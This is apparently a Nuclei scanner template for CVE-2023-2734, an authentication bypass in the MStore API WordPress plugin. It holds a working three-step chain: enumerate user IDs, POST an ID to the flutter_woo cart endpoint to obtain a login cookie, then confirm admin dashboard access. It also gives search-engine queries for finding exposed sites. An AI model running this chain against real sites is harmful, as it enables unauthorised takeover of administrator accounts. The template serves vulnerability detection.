flow: http(1) && http(2) && http(3)
http:
- attack: clusterbomb
  extractors:
  - internal: true
    json:
    - .[0].id
    name: user_id
    type: json
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "[{\"id", "name\":")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{route}}'
  payloads:
    route:
    - wp-json/wp/v2/users
    - ?rest_route=/wp/v2/users
  stop-at-first-match: true
- matchers:
  - condition: and
    dsl:
    - status_code == 200 || status_code == 500
    - contains(content_type, "application/json")
    - contains(header, "wordpress_logged_in_")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-json/api/flutter_woo/cart HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"customer_id":{{user_id}}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "Dashboard","Plugins","Edit Profile")
    type: dsl
  raw:
  - 'POST /wp-admin/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
id: CVE-2023-2734
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-2734
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 9.8
    cwe-id: CWE-200
    epss-percentile: 0.98191
    epss-score: 0.60337
  description: 'The MStore API plugin for WordPress is vulnerable to authentication
    bypass in versions up to, and including, 3.9.1. This is due to insufficient verification
    on the user being supplied during the cart sync from mobile REST API request through
    the plugin. This makes it possible for unauthenticated attackers to log in as
    any existing user on the site, such as an administrator, if they have access to
    the user id.

    '
  impact: 'Attackers can log in as any user, including administrators, potentially
    gaining full control over the site.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/mstore-api/"
    framework: wordpress
    max-request: 4
    product: mstore_api
    publicwww-query: /wp-content/plugins/mstore-api/
    vendor: inspireui
    verified: true
  name: MStore API <= 3.9.1 - Authentication Bypass
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/mstore-api/mstore-api-391-authentication-bypass
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2915729%40mstore-api&old=2913397%40mstore-api&sfp_email=&sfph_mail=#file59
  - https://nvd.nist.gov/vuln/detail/CVE-2023-2734
  remediation: 'Update to version 3.9.2 or later.

    '
  severity: critical
  tags: cve,cve2023,wordpress,wp,wp-plugin,inspireui,mstore_api,auth-bypass,vkev
